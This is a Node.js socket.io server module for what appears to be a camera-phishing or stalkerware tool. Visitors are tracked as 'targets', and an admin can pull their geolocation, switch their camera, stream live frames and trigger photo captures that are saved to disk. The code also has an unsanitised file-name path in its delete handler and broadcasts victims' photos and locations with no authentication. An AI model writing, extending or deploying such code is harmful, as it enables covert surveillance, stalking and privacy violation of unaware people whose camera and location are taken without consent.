const fs = require('fs');
const path = require('path');
const config = require('../config');

const uploadDir = path.join(__dirname, '..', 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

let storedPhotos = [];
let isLinkActive = true;
let connectedTargets = {};

module.exports = function(io) {
    io.on('connection', (socket) => {
        socket.on('disconnect', () => {
            delete connectedTargets[socket.id];
            io.emit('update-users-list', connectedTargets);
        });

        socket.on('admin-auth-success', () => {
            socket.emit('load-stored-photos', storedPhotos);
            socket.emit('update-users-list', connectedTargets);
        });

        socket.on('admin-toggle-link', (status) => {
            isLinkActive = status;
            if (!isLinkActive) io.emit('disable-user-access');
        });

        socket.on('user-ready', (data) => {
            if (!connectedTargets[socket.id]) connectedTargets[socket.id] = {};
            connectedTargets[socket.id].id = socket.id;
            connectedTargets[socket.id].deviceInfo = data && data.deviceInfo ? data.deviceInfo : 'Web User';
            io.emit('update-users-list', connectedTargets);
        });

        socket.on('admin-request-location', (targetSocketId) => {
            if (connectedTargets[targetSocketId]) {
                io.to(targetSocketId).emit('request-location');
            }
        });

        socket.on('user-location', (loc) => {
            if (connectedTargets[socket.id]) {
                connectedTargets[socket.id].location = loc;
                io.emit('update-users-list', connectedTargets);
            }
        });

        socket.on('admin-switch-camera', (data) => {
            if (connectedTargets[data.targetId]) {
                io.to(data.targetId).emit('switch-camera', data.facing);
            }
        });

        socket.on('live-stream-frame', (frameData) => {
            if (isLinkActive) {
                io.emit('update-live-stream', { socketId: socket.id, frameData });
            }
        });

        socket.on('admin-trigger-capture', (targetSocketId) => {
            if (isLinkActive && connectedTargets[targetSocketId]) {
                io.to(targetSocketId).emit('capture-photo');
            }
        });

        socket.on('user-photo-captured', (imageData) => {
            if (!isLinkActive) return;
            const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
            const fileName = 'photo_' + Date.now() + '_' + socket.id.substr(0,4) + '.jpg';
            const filePath = path.join(uploadDir, fileName);

            fs.writeFile(filePath, base64Data, 'base64', (err) => {
                if (!err) console.log('Saved: ' + fileName);
            });

            const photoObj = { imageData, fileName };
            storedPhotos.push(photoObj);
            if (storedPhotos.length > config.MAX_PHOTOS) storedPhotos.shift();

            io.emit('send-photo-to-admin', photoObj);
        });

        socket.on('delete-photo', (fileName) => {
            storedPhotos = storedPhotos.filter(p => p.fileName !== fileName);
            const filePath = path.join(uploadDir, fileName);
            if (fs.existsSync(filePath)) fs.unlink(filePath, () => {});
        });
    });
};
